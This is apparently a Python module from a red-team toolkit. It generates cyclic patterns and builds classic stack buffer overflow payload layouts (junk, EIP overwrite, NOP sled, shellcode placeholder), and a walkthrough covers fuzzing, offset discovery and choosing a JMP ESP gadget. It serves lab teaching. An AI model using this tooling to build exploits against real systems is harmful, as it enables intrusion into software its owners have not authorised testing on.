"""Buffer Overflow Walkthrough — W7 Red Team / C2.

A self-contained educational walkthrough of classic stack-based exploitation
shape: generate a de Bruijn-style cyclic pattern for offset discovery,
then build a staging payload layout (junk + EIP overwrite + NOP sled +
shellcode offset) given the crash offset and bad characters.
"""

from __future__ import annotations

from pathlib import Path
from typing import Dict, List

from ...core.tool import FieldSpec, ToolContext, ToolMeta

TOOL = ToolMeta(
    name="buffer-overflow",
    title="Buffer Overflow Walkthrough",
    wave=7,
    description=(
        "Educational walkthrough: cyclic patterns for offset discovery, "
        "bad-character filtering, and endian-ordered payload layouts for a "
        "classic stack overflow. Computes locally, sends nothing."
    ),
    category="redteam",
    mode="read",
    privileges="none",
    destructive=False,
    fields=[
        FieldSpec(name="mode", label="Mode", type="combo",
                  options=["cyclic", "payload", "walkthrough"],
                  default="walkthrough"),
        FieldSpec(name="length", label="Pattern length (cyclic)", type="int",
                  default=512),
        FieldSpec(name="offset", label="EIP offset", type="int",
                  default=146),
        FieldSpec(name="bad_chars", label="Bad characters", type="text",
                  default="\\x00\\x0a\\x0d"),
        FieldSpec(name="return_address", label="Return address (JMP ESP)",
                  type="text", default="\\x7d\\x91\\x08\\x08"),
        FieldSpec(name="shellcode_size", label="Shellcode size (bytes)",
                  type="int", default=350),
        FieldSpec(name="output_dir", label="Output directory (payload files)",
                  type="dir", default=None),
    ],
)

_CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


def _cyclic(length: int) -> str:
    out: List[str] = []
    total = 0
    for a in _CHARSET:
        for b in _CHARSET:
            for c in _CHARSET:
                out.append(a + b + c)
                total += 3
                if total >= length:
                    return "".join(out)[:length]
    return "".join(out)[:length]


def _parse_badchars(text: str) -> List[int]:
    import re
    hexes = re.findall(r"\\x([0-9a-fA-F]{2})", text)
    if not hexes:
        raise ValueError("bad_chars must be \\xNN strings, e.g. \\x00\\x0a\\x0d")
    return [int(h, 16) for h in hexes]


def _layout(offset: int, bad: List[int], ret_bytes: List[int], nops: int,
            shellcode_size: int) -> Dict[str, object]:
    junk = b"A" * offset
    badset = set(bad)
    eip = bytes(b for b in ret_bytes if b not in badset)
    if len(eip) != len(ret_bytes):
        raise ValueError("return address contains a bad character; "
                         "choose a different register/address")
    nop_sled = b"\x90" * nops
    sc_placeholder = b"\xcc" * shellcode_size
    payload = junk + eip + nop_sled + sc_placeholder
    return {
        "offset": offset,
        "eip_raw": ret_bytes,
        "junk_bytes": len(junk),
        "bad_chars": bad,
        "payload_size": len(payload),
        "payload_hex": payload.hex(),
        "layout_summary": (
            f"[{'A'*len(junk)}][EIP {''.join(f'\\\\x{b:02x}' for b in ret_bytes)}]"
            f"[NOP x{nops}][shellcode x{shellcode_size}]"),
    }


def _walkthrough() -> str:
    return (
        "Stack overflow walkthrough\n"
        "  1. fuzz: send increasing sizes to the vulnerable function until it "
        "crashes.\n"
        "  2. cyclic: use mode=cyclic to generate a pattern; crash the target "
        "with it.\n"
        "  3. find the offset from the EIP value in the debugger (or the "
        "'offset' field if you already know it).\n"
        "  4. badchars: build a byte-test payload and drop \\x00 etc. "
        "(see bad_chars).\n"
        "  5. control EIP: set return_address to a JMP ESP / POP-RET gadget in "
        "a non-ASLR module.\n"
        "  6. payload: build the final payload and append real shellcode of a "
        "length <= shellcode_size.\n"
        "\n"
        "Never run this against any host you do not own — it is a lab "
        "walkthrough only."
    )


def run(params: dict, ctx: ToolContext) -> dict:
    mode = str(params.get("mode") or "walkthrough")
    if mode not in ("cyclic", "payload", "walkthrough"):
        raise ValueError("mode must be cyclic, payload, or walkthrough")

    if mode == "walkthrough":
        return {"mode": mode, "guide": _walkthrough(),
                "tool_name": "buffer-overflow"}

    try:
        length = int(params.get("length") or 512)
        offset = int(params.get("offset") or 146)
        shellcode_size = int(params.get("shellcode_size") or 350)
    except (TypeError, ValueError):
        raise ValueError("length/offset/shellcode_size must be integers")
    if mode == "cyclic":
        pattern = _cyclic(length)
        return {"mode": mode, "length": len(pattern),
                "pattern": pattern,
                "hint": ("send the pattern to the target; read the EIP value "
                         "from the debugger crash and use offset = position "
                         "of that 4-byte substring in the pattern")}

    bad = _parse_badchars(str(params.get("bad_chars") or r"\x00\x0a\x0d"))
    if len(bad) > 32:
        raise ValueError("too many bad characters (max 32)")
    ret_text = str(params.get("return_address") or "\\x7d\\x91\\x08\\x08")
    try:
        ret_bytes = [int(p, 16) for p in ret_text.replace("\\x", " ")
                     .split()]
    except ValueError:
        ret_bytes = []
    if len(ret_bytes) != 4:
        raise ValueError("return_address must be 4 bytes "
                         "(\\xNN\\xNN\\xNN\\xNN)")
    layout = _layout(offset, bad, ret_bytes, 16, shellcode_size)

    written = ""
    out_dir = params.get("output_dir")
    if out_dir:
        out = Path(str(out_dir))
        out.mkdir(parents=True, exist_ok=True)
        target = out / "payload.bin"
        target.write_bytes(bytes.fromhex(layout["payload_hex"]))
        (out / "payload.txt").write_text(layout["payload_hex"] + "\n",
                                         encoding="utf-8")
        written = str(target)

    return {"mode": "payload", **layout, "output_file": written}


def render(result: dict) -> str:
    if result["mode"] == "walkthrough":
        return result["guide"]
    if result["mode"] == "cyclic":
        return (f"Cyclic pattern ({result['length']} bytes):\n"
                f"{result['pattern'][:256]}...\n{result['hint']}")
    return (f"Payload layout: {result['layout_summary']}\n"
            f"  size {result['payload_size']} bytes, offset {result['offset']}, "
            f"bad chars {[f'\\x{b:02x}' for b in result['bad_chars']]}\n"
            f"  payload.bin written: {result['output_file'] or 'not saved'}")